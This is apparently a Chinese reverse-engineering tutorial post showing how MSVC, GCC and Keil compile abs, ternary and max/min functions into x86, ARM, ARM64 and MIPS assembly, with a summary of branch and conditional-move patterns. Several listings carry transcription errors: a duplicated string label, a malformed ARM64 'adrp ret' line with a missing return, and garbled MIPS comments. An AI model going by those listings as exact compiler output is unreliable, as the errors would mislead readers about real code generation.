<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">my_abs:</span><br><span class="line">	subs p, sp, #16</span><br><span class="line">	str w0, [sp,12]</span><br><span class="line">	ldr w0, [sp,12]</span><br><span class="line">; compare input value with contents of WZR register</span><br><span class="line">; (which always holds zero)</span><br><span class="line">	cmp w0, wzr</span><br><span class="line">	bge .L2</span><br><span class="line">	ldr w0, [sp,12]</span><br><span class="line">	neg w0, w0</span><br><span class="line">	b .L3</span><br><span class="line">.L2:</span><br><span class="line">	ldr w0, [sp,12]</span><br><span class="line">.L3:</span><br><span class="line">	add sp, sp, 16</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
<h3 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h3><p>指令清单 Optimizing GCC 4.4.5 (IDA)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">my_abs:</span><br><span class="line">; jump if $a0&lt;0:</span><br><span class="line">	bltz $a0, locret_10</span><br><span class="line">; just return input value ($a0) in $v0:</span><br><span class="line">	move $v0, $a0</span><br><span class="line">	jr $ra</span><br><span class="line">	or $at, $zero ; branch delay slot, NOP</span><br><span class="line">locret_10:</span><br><span class="line">; negate input value and store it in $v0:</span><br><span class="line">	jr $ra</span><br><span class="line">; this is pseudoinstruction. in fact, this is &quot;subu $v0,$zero,$a0&quot; ($v0=0-$a0)</span><br><span class="line">	negu $v0, $a0</span><br></pre></td></tr></table></figure>
<p>这里出现了新指令 BLTZ(Branch if Less Than Zero),以及伪指令 NEGU。NEGU 指令计算零减去操作数的差。SUBU 和 NEGU 指令中的后缀 U 代表它的操作数是无符号型数据,并且在整数溢出的情况下不会触发异常处理机制。</p>
<h2 id="条件运算符"><a href="#条件运算符" class="headerlink" title="条件运算符"></a>条件运算符</h2><h3 id="程序-1"><a href="#程序-1" class="headerlink" title="程序"></a>程序</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> const char* f (int a)</span><br><span class="line">&#123;</span><br><span class="line">	return a==10 ? &quot;it is ten&quot; : &quot;it is not ten&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="x86-1"><a href="#x86-1" class="headerlink" title="x86"></a>x86</h3><p>在编译含有条件运算符的语句时,早期无优化功能的编译器会以编译“if&#x2F;else”语句的方法进行处理。<br>指令清单 Non-optimizing MSVC 2008</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$SG746 DB &#x27;it is ten&#x27;, 00H</span><br><span class="line">$SG747 DB &#x27;it is not ten&#x27;, 00H</span><br><span class="line"></span><br><span class="line">tv65 = -4 ; this will be used as a temporary variable</span><br><span class="line">_a$ = 8</span><br><span class="line">_f	PROC</span><br><span class="line">	push ebp</span><br><span class="line">	mov ebp, esp</span><br><span class="line">	push ecx</span><br><span class="line">; compare input value with 10</span><br><span class="line">	cmp DWORD PTR _a$[ebp], 10</span><br><span class="line">; jump to $LN3@f if not equal</span><br><span class="line">	jne SHORT $LN3@f</span><br><span class="line">; store pointer to the string into temporary variable:</span><br><span class="line">	mov DWORD PTR tv65[ebp], OFFSET $SG746 ; &#x27;it is ten&#x27;</span><br><span class="line">; jump to exit</span><br><span class="line">	jmp SHORT $LN4@f</span><br><span class="line">$LN3@f:</span><br><span class="line">; store pointer to the string into temporary variable:</span><br><span class="line">	mov DWORD PTR tv65[ebp], OFFSET $SG747 ; &#x27;it is not ten&#x27;</span><br><span class="line">$LN4@f:</span><br><span class="line">; this is exit. copy pointer to the string from temporary variable to EAX.</span><br><span class="line">	mov eax, DWORD PTR tv65[ebp]</span><br><span class="line">	mov esp, ebp</span><br><span class="line">	pop ebp</span><br><span class="line">	ret 0</span><br><span class="line">_f	ENDP Optimizing MSVC 2008</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>指令清单  Optimizing MSVC 2008</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$SG792 DB &#x27;it is ten&#x27;, 00H</span><br><span class="line">$SG792 DB &#x27;it is not ten&#x27;, 00H</span><br><span class="line">_a$ = 8 ; size = 4</span><br><span class="line">_f	PROC</span><br><span class="line">; compare input value with 10</span><br><span class="line">	cmp DWORD PTR _a$[esp-4], 10</span><br><span class="line">	mov eax, OFFSET $SG792 ; &#x27;it is ten&#x27;</span><br><span class="line">; jump to $LN4@f if equal</span><br><span class="line">	je SHORT $LN4@f</span><br><span class="line">	mov eax, OFFSET $SG793 ; &#x27;it is not ten&#x27;</span><br><span class="line">$LN4@f:</span><br><span class="line">	ret 0</span><br><span class="line">_f	ENDP</span><br></pre></td></tr></table></figure>
<p>新编译器生成的程序更为简洁。<br>指令清单 Optimizing MSVC 2012 x64</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$SG1355 DB		&#x27;it is ten&#x27;, 00H</span><br><span class="line">$SG1356 DB		&#x27;it is not ten&#x27;, 00H</span><br><span class="line"></span><br><span class="line">a$	= 8</span><br><span class="line">f	PROC</span><br><span class="line">; load pointers to the both strings</span><br><span class="line">	lea rdx, OFFSET FLAT:$SG1355 ; &#x27;it is ten&#x27;</span><br><span class="line">	lea rax, OFFSET FLAT:$SG1356 ; &#x27;it is not ten&#x27;</span><br><span class="line">; compare input value with 10</span><br><span class="line">	cmp ecx, 10</span><br><span class="line">; if equal, copy value from RDX (&quot;it is ten&quot;)</span><br><span class="line">; if not, do nothing. pointer to the string &quot;it is not ten&quot; is still in RAX as for now.</span><br><span class="line">	cmove rax, rdx</span><br><span class="line">	ret 0</span><br><span class="line">f	ENDP</span><br></pre></td></tr></table></figure>
<p>启用优化选项后,GCC 4.8 生成的 x86 指令同样使用了 CMOVcc 指令。相比之下,在关闭优化功能的情况下,GCC 4.8 用条件转移指令编译条件操作符。</p>
<h3 id="ARM-1"><a href="#ARM-1" class="headerlink" title="ARM"></a>ARM</h3><p>启用优化功能之后,Keil 生成的 ARM 代码会应用条件运行指令 ADRcc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f PROC</span><br><span class="line">; compare input value with 10</span><br><span class="line">	CMP r0, #0xa</span><br><span class="line">; if comparison result is EQual, copy pointer to the &quot;it is ten&quot; string into R0</span><br><span class="line">	ADREQ r0,|L0.16| ; &quot;it is ten&quot;</span><br><span class="line">; if comparison result is Not Equal, copy pointer to the &quot;it is not ten&quot; string into R0</span><br><span class="line">	ADRNE r0,|L0.28| ; &quot;it is not ten&quot;</span><br><span class="line">	BX lr</span><br><span class="line">	ENDP</span><br><span class="line">|L0.16|</span><br><span class="line">	DCB &quot;it is ten&quot;,0</span><br><span class="line">|L0.28|</span><br><span class="line">	DCB &quot;it is not ten&quot;,0</span><br></pre></td></tr></table></figure>
<p>除非存在人为干预,否则 ADREQ 和 ADRNE 指令不可能在同一次调用期间都被执行。<br>在启用优化功能之后,Keil 会给编译出的 Thumb 模式代码分配条件转移指令。毕竟在 Thumb 模式的指令之中,没有支持标志位判断的赋值指令。<br>指令清单  Optimizing Keil 6&#x2F;2013 (Thumb mode)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f PROC</span><br><span class="line">; compare input value with 10</span><br><span class="line">	CMP r0,#0xa</span><br><span class="line">; jump to |L0.8| if EQual</span><br><span class="line">	BEQ |L0.8|</span><br><span class="line">	ADR r0,|L0.12| ; &quot;it is not ten&quot;</span><br><span class="line">	BX lr</span><br><span class="line">|L0.8|</span><br><span class="line">	ADR r0,|L0.28| ; &quot;it is ten&quot;</span><br><span class="line">	BX lr</span><br><span class="line">	ENDP</span><br><span class="line">|L0.12|</span><br><span class="line">	DCB &quot;it is not ten&quot;,0</span><br><span class="line">|L0.28|</span><br><span class="line">	DCB &quot;it is ten&quot;,0</span><br></pre></td></tr></table></figure>
<h3 id="ARM64"><a href="#ARM64" class="headerlink" title="ARM64"></a>ARM64</h3><p>启用优化功能之后,GCC(Linaro)4.9 编译出来的 ARM64 程序同样用条件转移指令实现条件运算符。<br>指令清单  Optimizing GCC (Linaro) 4.9</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f:</span><br><span class="line">	cmp x0, 10</span><br><span class="line">	beq .L3     ; branch if equal</span><br><span class="line">	adrp x0, .LC1 ; &quot;it is ten&quot;</span><br><span class="line">	add x0, x0, :lo12:.LC1</span><br><span class="line">	ret </span><br><span class="line">.L3:</span><br><span class="line">	adrp ret x0, .LC0 ; &quot;it is not ten&quot;</span><br><span class="line">	add x0, x0, :lo12:.LC0</span><br><span class="line">.LC0:</span><br><span class="line">	.string &quot;it is ten&quot;</span><br><span class="line">.LC1:</span><br><span class="line">	.string &quot;it is not ten&quot;</span><br></pre></td></tr></table></figure>
<p>ARM64 同样没有能够判断标志位的条件赋值指令。而 32 位的ARM指令集 1 ,以及x86 的CMOVcc指令都可以根据相应标志位进行条件赋值。虽然ARM64 存在“条件选择”指令CSEL(Conditional SELect),但是GCC 4.9 似乎无法给这种程序分配上这条指令。</p>
<h3 id="MIPS-1"><a href="#MIPS-1" class="headerlink" title="MIPS"></a>MIPS</h3><p>不幸的是,GCC 4.45 在编译 MIPS 程序方面的智能程度也有待完善。<br>指令清单  Optimizing GCC 4.4.5 (assembly output)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$LC0:</span><br><span class="line">	.ascii &quot;it is not ten\000&quot;</span><br><span class="line">$LC1:</span><br><span class="line">	.ascii &quot;it is ten\000&quot;</span><br><span class="line">f:</span><br><span class="line">	li $2,10     # 0xa</span><br><span class="line">; compare $a0 and 10, jump if equal:</span><br><span class="line">	beq $4,$2,$L2</span><br><span class="line">	nop ; branch delay slot</span><br><span class="line"></span><br><span class="line">; leave address  of &quot;it is not ten&quot; string in $v0 and return:</span><br><span class="line">	lui $2,%hi($LC0)</span><br><span class="line">	j $31</span><br><span class="line">	addiu $2,$2,%lo($LC0)</span><br><span class="line">$L2:</span><br><span class="line">; leave address of &quot;it is ten&quot; string in $v0 and return:</span><br><span class="line">	lui $2,%hi($LC1)</span><br><span class="line">	j $31</span><br><span class="line">	addiu $2,$2,%lo($LC1)</span><br></pre></td></tr></table></figure>
<h3 id="使用-if-x2F-else-替代条件运算符"><a href="#使用-if-x2F-else-替代条件运算符" class="headerlink" title="使用 if&#x2F;else 替代条件运算符"></a>使用 if&#x2F;else 替代条件运算符</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const char* f (int a)</span><br><span class="line">&#123;</span><br><span class="line">if (a==10)</span><br><span class="line">return &quot;it is ten&quot;;</span><br><span class="line">else</span><br><span class="line">return &quot;it is not ten&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>启用优化功能之后,GCC 4.8 在编译 x86 程序时能够应用 CMOVcc 指令。<br>指令清单 Optimizing GCC 4.8</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.LC0:</span><br><span class="line">	.string &quot;it is ten&quot;</span><br><span class="line">.LC1:</span><br><span class="line">	.string &quot;it is not ten&quot;</span><br><span class="line">f:</span><br><span class="line">.LFB0:</span><br><span class="line">; compare input value with 10</span><br><span class="line">	cmp DWORD PTR [esp+4], 10</span><br><span class="line">	mov edx, OFFSET FLAT:.LC1 ; &quot;it is not ten&quot;</span><br><span class="line">	mov eax, OFFSET FLAT:.LC0 ; &quot;it is ten&quot;</span><br><span class="line">; if comparison result is Not Equal, copy EDX value to EAX</span><br><span class="line">; if not, do nothing</span><br><span class="line">	cmovne eax, edx</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>启用优化功能之后,编译器会尽可能地避免使用条件转移指令。</p>
<h2 id="比较最大值和最小值"><a href="#比较最大值和最小值" class="headerlink" title="比较最大值和最小值"></a>比较最大值和最小值</h2><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><h4 id="程序-2"><a href="#程序-2" class="headerlink" title="程序"></a>程序</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int my_max(int a, int b)</span><br><span class="line">&#123;</span><br><span class="line">	if (a&gt;b)</span><br><span class="line">		return a;</span><br><span class="line">	else</span><br><span class="line">		return b;</span><br><span class="line">&#125;;</span><br><span class="line">int my_min(int a, int b)</span><br><span class="line">&#123;</span><br><span class="line">	if (a&lt;b)</span><br><span class="line">		return a;</span><br><span class="line">	else</span><br><span class="line">		return b;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="指令清单-Non-optimizing-MSVC-2013"><a href="#指令清单-Non-optimizing-MSVC-2013" class="headerlink" title="指令清单 Non-optimizing MSVC 2013"></a>指令清单 Non-optimizing MSVC 2013</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_a$ = 8</span><br><span class="line">_b$ = 12</span><br><span class="line">_my_min PROC</span><br><span class="line">	push ebp</span><br><span class="line">	mov ebp, esp</span><br><span class="line">	mov eax, DWORD PTR _a$[ebp]</span><br><span class="line">; compare A and B:</span><br><span class="line">	cmp eax, DWORD PTR _b$[ebp]</span><br><span class="line">; jump, if A is greater or equal to B:</span><br><span class="line">	jge SHORT $LN2@my_min</span><br><span class="line">; reload A to EAX if otherwise and jump to exit</span><br><span class="line">	mov eax, DWORD PTR _a$[ebp]</span><br><span class="line">	jmp SHORT $LN3@my_min</span><br><span class="line">	jmp SHORT $LN3@my_min ; this is redundant JMP</span><br><span class="line">$LN2@my_min:</span><br><span class="line">; return B</span><br><span class="line">	mov eax, DWORD PTR _b$[ebp]</span><br><span class="line">$LN3@my_min:</span><br><span class="line">	pop ebp</span><br><span class="line">	ret 0</span><br><span class="line">_my_min ENDP</span><br><span class="line">_a$ = 8</span><br><span class="line">_b$ = 12</span><br><span class="line">_my_max PROC</span><br><span class="line">	push ebp</span><br><span class="line">	mov ebp, esp</span><br><span class="line">	mov eax, DWORD PTR _a$[ebp]</span><br><span class="line">; compare A and B:</span><br><span class="line">	cmp eax, DWORD PTR _b$[ebp]</span><br><span class="line">; jump if A is less or equal to B:</span><br><span class="line">	jle SHORT $LN2@my_max</span><br><span class="line">; reload A to EAX if otherwise and jump to exit</span><br><span class="line">	mov eax, DWORD PTR _a$[ebp]</span><br><span class="line">	jmp SHORT $LN3@my_max</span><br><span class="line">	jmp SHORT $LN3@my_max ; this is redundant JMP</span><br><span class="line">$LN2@my_max:</span><br><span class="line">; return B</span><br><span class="line">	mov eax, DWORD PTR _b$[ebp]</span><br><span class="line">$LN3@my_max:</span><br><span class="line">	pop ebp</span><br><span class="line">	ret 0</span><br><span class="line">_my_max ENDP</span><br></pre></td></tr></table></figure>
<p>两个函数的唯一区别就是条件转移指令:第一个函数使用的是 JGE(Jump if Greater or Equal),而第二个函数使用的是 JLE(Jump if Less or Equal)。上述每个函数里都存在一个多余的 JMP 指令。这可能是 MSVC 的问题。</p>
<p>** 无分支指令的编译方法**<br>Keil 编译的 Thumb 模式程序与 x86 程序有几分相似</p>
<h4 id="指令清单-Optimizing-Keil-6-x2F-2013-Thumb-mode"><a href="#指令清单-Optimizing-Keil-6-x2F-2013-Thumb-mode" class="headerlink" title="指令清单   Optimizing Keil 6&#x2F;2013 (Thumb mode)"></a>指令清单   Optimizing Keil 6&#x2F;2013 (Thumb mode)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">my_max PROC</span><br><span class="line">; R0=A</span><br><span class="line">; R1=B</span><br><span class="line">; compare A and B:</span><br><span class="line">	CMP r0,r1</span><br><span class="line">; branch if A is greater then B:</span><br><span class="line">	BGT |L0.6|</span><br><span class="line">; otherwise (A&lt;=B) return R1 (B):</span><br><span class="line">	MOVS r0,r1</span><br><span class="line">|L0.6|</span><br><span class="line">; return</span><br><span class="line">	BX lr</span><br><span class="line">	ENDP</span><br><span class="line">my_min PROC</span><br><span class="line">; R0=A</span><br><span class="line">; R1=B</span><br><span class="line">; compare A and B:</span><br><span class="line">	CMP r0,r1</span><br><span class="line">; branch if A is less then B:</span><br><span class="line">	BLT |L0.14|</span><br><span class="line">; otherwise (A&gt;=B) return R1 (B):</span><br><span class="line">	MOVS r0,r1</span><br><span class="line">|L0.14|</span><br><span class="line">; return</span><br><span class="line">	BX lr</span><br><span class="line">	ENDP</span><br></pre></td></tr></table></figure>
<p>两个函数所用的转移指令不同:一个是 BGT,而另一个是 BLT。<br>在编译 ARM 模式程序时,编译器可能会使用条件执行指令(即“有分支”指令)<br>。这种程序会显得更为短小。在编译条件表达式时,Keil 编译器使用了 MOVcc 指令。</p>
<h4 id="指令清单-Optimizing-Keil-6-x2F-2013-ARM-mode"><a href="#指令清单-Optimizing-Keil-6-x2F-2013-ARM-mode" class="headerlink" title="指令清单  Optimizing Keil 6&#x2F;2013 (ARM mode)"></a>指令清单  Optimizing Keil 6&#x2F;2013 (ARM mode)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">my_max PROC</span><br><span class="line">; R0=A</span><br><span class="line">; R1=B</span><br><span class="line">; compare A and B:</span><br><span class="line">	CMP r0,r1</span><br><span class="line">; return B instead of A by placing B in R0</span><br><span class="line">; this instruction will trigger only if A&lt;=B (hence, LE - Less or Equal)</span><br><span class="line">; if instruction is not triggered (in case of A&gt;B), A is still in R0 register</span><br><span class="line">	MOVLE r0,r1</span><br><span class="line">	BX lr</span><br><span class="line">	ENDP</span><br><span class="line">my_min PROC</span><br><span class="line">; R0=A</span><br><span class="line">; R1=B</span><br><span class="line">; compare A and B:</span><br><span class="line">	CMP r0,r1</span><br><span class="line">; return B instead of A by placing B in R0</span><br><span class="line">; this instruction will trigger only if A&gt;=B (hence, GE - Greater or Equal)</span><br><span class="line">; if instruction is not triggered (in case of A&lt;B), A value is still in R0 register</span><br><span class="line">	MOVGE r0,r1</span><br><span class="line">	BX lr</span><br><span class="line">	ENDP</span><br></pre></td></tr></table></figure>
<p>在启用优化功能的情况下,GCC 4.8.1 和 MSVC 2013 都能使用 CMOVcc 指令。这个指令相当于 ARM程序里的 MOVcc 指令。</p>
<h4 id="指令清单-Optimizing-MSVC-2013"><a href="#指令清单-Optimizing-MSVC-2013" class="headerlink" title="指令清单  Optimizing MSVC 2013"></a>指令清单  Optimizing MSVC 2013</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">my_max:</span><br><span class="line">	mov edx, DWORD PTR [esp+4]</span><br><span class="line">	mov eax, DWORD PTR [esp+8]</span><br><span class="line">; EDX=A</span><br><span class="line">; EAX=B</span><br><span class="line">; compare A and B:</span><br><span class="line">	cmp edx, eax</span><br><span class="line">; if A&gt;=B, load A value into EAX</span><br><span class="line">; the instruction idle if otherwise (if A&lt;B)</span><br><span class="line">	cmovge eax, edx</span><br><span class="line">	ret</span><br><span class="line">my_min:</span><br><span class="line">	mov edx, DWORD PTR [esp+4]</span><br><span class="line">	mov eax, DWORD PTR [esp+8]</span><br><span class="line">; EDX=A</span><br><span class="line">; EAX=B</span><br><span class="line">; compare A and B:</span><br><span class="line">	cmp edx, eax</span><br><span class="line">; if A&lt;=B, load A value into EAX</span><br><span class="line">; the instruction idle if otherwise (if A&gt;B)</span><br><span class="line">	cmovle eax, edx</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
<h3 id="64-位"><a href="#64-位" class="headerlink" title="64 位"></a>64 位</h3><h4 id="程序-3"><a href="#程序-3" class="headerlink" title="程序"></a>程序</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">int64_t my_max(int64_t a, int64_t b)</span><br><span class="line">&#123;</span><br><span class="line">	if (a&gt;b)</span><br><span class="line">		return a;</span><br><span class="line">	else</span><br><span class="line">		return b;</span><br><span class="line">&#125;;</span><br><span class="line">int64_t my_min(int64_t a, int64_t b)</span><br><span class="line">&#123;</span><br><span class="line">	if (a&lt;b)</span><br><span class="line">		return a;</span><br><span class="line">	else</span><br><span class="line">		return b;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>虽然编译出来的程序里存在不必要的数据交换,但是代码功能一目了然</p>
<h4 id="指令清单-Non-optimizing-GCC-4-9-1-ARM64"><a href="#指令清单-Non-optimizing-GCC-4-9-1-ARM64" class="headerlink" title="指令清单 Non-optimizing GCC 4.9.1 ARM64"></a>指令清单 Non-optimizing GCC 4.9.1 ARM64</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">my_max:</span><br><span class="line">	sub sp,sp,#16</span><br><span class="line">	str x0,[sp,8]</span><br><span class="line">	str x1,[sp]</span><br><span class="line">	ldr x1,[sp,8]</span><br><span class="line">	ldr x0,[sp]</span><br><span class="line">	cmp X1,X0</span><br><span class="line">	ble .L2</span><br><span class="line">	ldr x0,[sp,8]</span><br><span class="line">	b .L3</span><br><span class="line">.L2:	</span><br><span class="line">	ldr x0,[sp]</span><br><span class="line">.L3:</span><br><span class="line">	add sp,sp,#16</span><br><span class="line">	ret</span><br><span class="line">my_min:</span><br><span class="line">	sub sp,sp,#16</span><br><span class="line">	str x0,[sp,8]</span><br><span class="line">	str x1,[sp]</span><br><span class="line">	ldr x1,[sp,8]</span><br><span class="line">	ldr x0,[sp]</span><br><span class="line">	cmp x1,x0</span><br><span class="line">	bge .L5</span><br><span class="line">	ldr x0,[sp]</span><br><span class="line">	b .L6</span><br><span class="line">.L5:</span><br><span class="line">	ldr x0,[sp]</span><br><span class="line">.L6:</span><br><span class="line">	add sp,sp,16</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
<p>无分支指令的编译方法<br>既然函数参数就在寄存器里,那么就不必通过栈访问它们。</p>
<h4 id="指令清单-Optimizing-GCC-4-9-1-x64"><a href="#指令清单-Optimizing-GCC-4-9-1-x64" class="headerlink" title="指令清单   Optimizing GCC 4.9.1 x64"></a>指令清单   Optimizing GCC 4.9.1 x64</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">my_max:</span><br><span class="line">; RDI=A</span><br><span class="line">; RSI=B</span><br><span class="line">; compare A and B:</span><br><span class="line">	cmp rdi, rsi</span><br><span class="line">; prepare B in RAX for return:</span><br><span class="line">	mov rax, rsi</span><br><span class="line">; if A&gt;=B, put A (RDI) in RAX for return.</span><br><span class="line">; this instruction is idle if otherwise (if A&lt;B)</span><br><span class="line">	cmovge rax, rdi</span><br><span class="line">	ret</span><br><span class="line">my_min:</span><br><span class="line">; RDI=A</span><br><span class="line">; RSI=B</span><br><span class="line">; compare A and B:</span><br><span class="line">	cmp rdi, rsi</span><br><span class="line">; prepare B in RAX for return:</span><br><span class="line">	mov rax, rsi</span><br><span class="line">; if A&lt;=B, put A (RDI) in RAX for return.</span><br><span class="line">; this instruction is idle if otherwise (if A&gt;B)</span><br><span class="line">	cmovle rax, rdi</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
<p>MSVC 2013 的编译方法几乎一样。ARM64 指令集里有 CSEL 指令。它相当于 ARM 指令集中的 MOVcc 指令,以及 x86 平台的 CMOVcc指令。它只是名字不同:“Conditional SELect”。</p>
<h4 id="指令清单-Optimizing-GCC-4-9-1-ARM64"><a href="#指令清单-Optimizing-GCC-4-9-1-ARM64" class="headerlink" title="指令清单  Optimizing GCC 4.9.1 ARM64"></a>指令清单  Optimizing GCC 4.9.1 ARM64</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">my_max:</span><br><span class="line">; X0=A</span><br><span class="line">; X1=B</span><br><span class="line">; compare A and B:</span><br><span class="line">	cmp x0, x1</span><br><span class="line">; select X0 (A) to X0 if X0&gt;=X1 or A&gt;=B (Greater or Equal)</span><br><span class="line">; select X1 (B) to X0 if A&lt;B</span><br><span class="line">	csel x0, x0, x1, ge</span><br><span class="line">	ret</span><br><span class="line">my_min:</span><br><span class="line">; X0=A</span><br><span class="line">; X1=B</span><br><span class="line">; compare A and B:</span><br><span class="line">	cmp x0, x1</span><br><span class="line">; select X0 (A)  to X0 if X0&lt;=X1 or A&lt;=B (Less or Equal)</span><br><span class="line">; select X1 (B) to X0 if A&gt;B</span><br><span class="line">	csel x0, x0, x1, le</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
<h3 id="MIPS-2"><a href="#MIPS-2" class="headerlink" title="MIPS"></a>MIPS</h3><p>不幸的是,GCC 4.4.5 在编译 MIPS 程序方面的智能化程度有限。<br>指令清单 12.33 Optimizing GCC 4.4.5 (IDA)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">my_max:</span><br><span class="line">; set $v1 $a1&lt;$a0,or clear otherwise (if $01&gt;$a0):</span><br><span class="line">	slt $v1, $a1, $a0</span><br><span class="line">; jump, if $v1 iso (or $a1&gt;$a9):</span><br><span class="line">	beqz $v1, locret_10</span><br><span class="line">; this is branch delay slot</span><br><span class="line">; prepare $a1 in $v0 in case of branch triggered:</span><br><span class="line">	move $v0, $a1</span><br><span class="line">; no branch triggered, prepare $a0 in $v0:</span><br><span class="line">	move $v0, $a0</span><br><span class="line">locret_10:</span><br><span class="line">	jr $ra</span><br><span class="line">	or $at, $zero ; branch delay slot, NOP</span><br><span class="line">; the min() function is same, but input operands in SLT instruction are swapped:</span><br><span class="line">my_min</span><br><span class="line">	slt $v1, $a0, $a1</span><br><span class="line">	beqz $v1, locret_28</span><br><span class="line">	move $v0, $a1</span><br><span class="line">	move $v0, $a0</span><br><span class="line">locret_28:</span><br><span class="line">	jr $ra</span><br><span class="line">	or $at, $zero ; branch delay slot, NOP</span><br></pre></td></tr></table></figure>
<p>请注意分支延时槽现象:第一个 MOVE 指令“先于”BEQZ 指令运行,而第二个 MOVE 指令仅在不发生跳转的情况下才会被执行。</p>
<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p> 条件转移指令的构造大体如下。</p>
<h3 id="x86-2"><a href="#x86-2" class="headerlink" title="x86"></a>x86</h3><p>指令清单  x86</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CMP register, register/value</span><br><span class="line">Jcc true ; cc=condition code</span><br><span class="line">false:</span><br><span class="line">... some code to be executed if comparison result is false ...</span><br><span class="line">JMP exit</span><br><span class="line">true:</span><br><span class="line">... some code to be executed if comparison result is true ...</span><br><span class="line">exit:</span><br></pre></td></tr></table></figure>
<h3 id="ARM-2"><a href="#ARM-2" class="headerlink" title="ARM"></a>ARM</h3><p>指令清单 ARM</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CMP register, register/value</span><br><span class="line">Bcc true ; cc=condition code</span><br><span class="line">false:</span><br><span class="line">... some code to be executed if comparison result is false ...</span><br><span class="line">JMP exit</span><br><span class="line">true:</span><br><span class="line">... some code to be executed if comparison result is true ...</span><br><span class="line">exit:</span><br></pre></td></tr></table></figure>
<h3 id="MIPS-3"><a href="#MIPS-3" class="headerlink" title="MIPS"></a>MIPS</h3><p>指令清单  遇零跳转</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BEQZ REG, label</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>指令清单 遇负数跳转</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BLTZ REG, label</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>指令清单 值相等的情况下跳转</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BEQ REG1, REG2, label</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>指令清单  值不等的情况下跳转</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BNE REG1, REG2, label</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>指令清单  第一个值小于第二个值的情况下跳转(signed)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SLT REG1, REG2, REG3</span><br><span class="line">BEQ REG1, label</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>指令清单  第一个值小于第二个值的情况下跳转(unsigned)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SLTU REG1, REG2, REG3</span><br><span class="line">BEQ REG1, label</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h3 id="无分支指令-非条件指令"><a href="#无分支指令-非条件指令" class="headerlink" title="无分支指令(非条件指令)"></a>无分支指令(非条件指令)</h3><p>如果条件语句十分短,那么编译器可能会分配条件执行指令:</p>
<ol>
<li>编译 ARM 模式的程序时应用 MOVcc 指令。</li>
<li>编译 ARM64 程序时应用 CSEL 指令。</li>
<li>编译 x86 程序时应用 CMOVcc 指令。</li>
</ol>
<p>####ARM<br>在编译 ARM 模式的程序时,编译器可能用条件执行指令替代条件转移指令。<br>指令清单 ARM (ARM mode)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CMP register, register/value</span><br><span class="line">instr1_cc ; some instruction will be executed if condition code is true</span><br><span class="line">instr2_cc ; some other instruction will be executed if other condition code is true</span><br><span class="line">... etc ...</span><br></pre></td></tr></table></figure>
<p>在被执行指令不修改任何标志位的情况下,程序可有任意多条的条件执行指令。<br>Thumb 模式的指令集里有 IT 指令。它可以把后续四条指令构成一个指令组,并且在条件表达式为真的时候运行这组指令。</p>
<p>指令清单 ARM (Thumb mode)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CMP register, register/value</span><br><span class="line">ITEEE EQ ; set these suffixes: if-then-else-else-else</span><br><span class="line">instr1	;instraction will be executed if condition is true</span><br><span class="line">instr2	;instraction will be executed if condition is false</span><br><span class="line">instr3	;instraction will be executed if condition is false</span><br><span class="line">instr4	;instraction will be executed if condition is false</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title>逆向工程——汇编基础（三）</title>
